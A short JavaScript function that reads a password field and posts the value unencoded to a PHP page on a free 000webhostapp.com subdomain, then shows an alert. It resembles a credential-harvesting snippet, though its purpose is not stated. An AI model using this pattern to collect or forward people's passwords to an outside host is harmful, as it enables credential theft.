function submitPassword() {
    const password = document.getElementById("password").value;
    const url = "https://arousedproject.000webhostapp.com/password.php";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
      if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
        alert("Password entered");
      }
    };
    xhr.send(`password=${password}`);
  }
  